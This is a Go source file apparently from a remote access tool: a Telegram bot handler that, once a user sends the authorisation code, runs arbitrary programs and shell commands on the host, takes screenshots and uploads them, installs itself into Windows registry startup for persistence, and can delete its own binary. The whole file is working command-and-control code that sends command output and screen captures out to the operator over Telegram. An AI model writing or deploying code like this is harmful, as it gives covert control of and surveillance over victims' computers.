package telegraph

import (
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	"internal/commands"
	"internal/settings"
	"log"
	"os"
	"strings"
)

func (t Telegraphist) HandleCommand(update tgbotapi.Update) {
	log.Printf("[%s] %s", update.Message.From.UserName, update.Message.Text)
	if update.Message.IsCommand() {
		command := update.Message.Command()
		if !t.authenticatedUsers[update.Message.From.ID].authenticated && command != "authorize" {
			t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized, use /authorize <code> to authorize yourself"))
			return
		}
		user := t.authenticatedUsers[update.Message.From.ID]
		switch command {
		case "help":
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
			msg.Text = strings.Join([]string{
				"List of commands:",
				"/help - shows this message",
				"/authorize - authorizes you",
				"/end - removes you from memory",
				"/install - installs parrot and adds it to registry startup",
				"/screen - takes a commands",
				"/pwd - shows current path",
				"/exec - executes a program in local context",
				"/cmd - runs a command (Be careful about using quotes)",
			}, "\n")
			_, err := t.bot.Send(msg)
			if err != nil {
				log.Println(err)
			}
		case "pwd":
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, user.currentPath))
			if err != nil {
				fmt.Println(err)
			}
		case "install":
			ok, err := commands.Install(os.Args[0])
			if err != nil {
				t.ReportError(fmt.Sprintf("An error occured: %v", err), update.Message.Chat.ID)
			}
			if !ok {
				t.ReportError("Something went wrong :(", update.Message.Chat.ID)
			} else {
				t.ReportError("Success :)", update.Message.Chat.ID)
			}
		case "uninstall":
			ok, err := commands.Uninstall()
			if err != nil {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
				if err != nil {
					fmt.Println(err)
				}
				return
			}
			if !ok {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Something bad has happened :("))
				if err != nil {
					fmt.Println(err)
				}
				return
			}
			_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
			if err != nil {
				fmt.Println(err)
			}

		case "removeSelf":
			err := os.Remove(os.Args[0])
			if err != nil {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, fmt.Sprintf("Something went wrong: %v", err)))
				if err != nil {
					fmt.Println(err)
				}
			} else {
				_, err = t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Success :)"))
				if err != nil {
					fmt.Println(err)
				}
			}
		case "screen":
			img, err := commands.TakeScreenShot()
			if err != nil {
				errorText := fmt.Sprintf("An error occured during taking screenshot: %v", err)
				t.ReportError(errorText, update.Message.Chat.ID)
				log.Println(err)
			}
			for _, img2send := range img {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, img2send)
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			}
		case "exec":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/exec")[1:], " ")
			out := commands.StartCommand(cmd)
			if len(out) > 4096 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "exec.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Println(err)
				}
			}
		case "cmd":
			cmd := strings.Join(strings.SplitAfter(update.Message.Text, "/cmd")[1:], " ")
			out := commands.RunCommand(cmd)
			if len(out) > 4096 {
				doc := tgbotapi.NewDocumentUpload(update.Message.Chat.ID, tgbotapi.FileBytes{
					Name:  "command.txt",
					Bytes: []byte(out),
				})
				_, err := t.bot.Send(doc)
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, out))
				if err != nil {
					log.Println(err)
				}
			}
		case "authorize":
			inCode := strings.Join(strings.SplitAfter(update.Message.Text, "/authorize ")[1:], "")
			if inCode == settings.AuthorizationCode {
				t.authenticatedUsers[update.Message.From.ID] = User{authenticated: true, currentPath: getDirPath(os.Args[0])}
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Code correct :)"))
				if err != nil {
					log.Println(err)
				}
			} else {
				_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Code incorrect :("))
				if err != nil {
					log.Println(err)
				}
			}
		case "end":
			delete(t.authenticatedUsers, update.Message.From.ID)
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Your chat ID is no longer present in memory"))
			if err != nil {
				log.Println(err)
			}

		default:
			_, err := t.bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "I don't know this command"))
			if err != nil {
				log.Panic(err)
			}
		}
	}
}

func getDirPath(p string) string {
	i := strings.LastIndex(p, "\\")
	return p[:i+1]
}
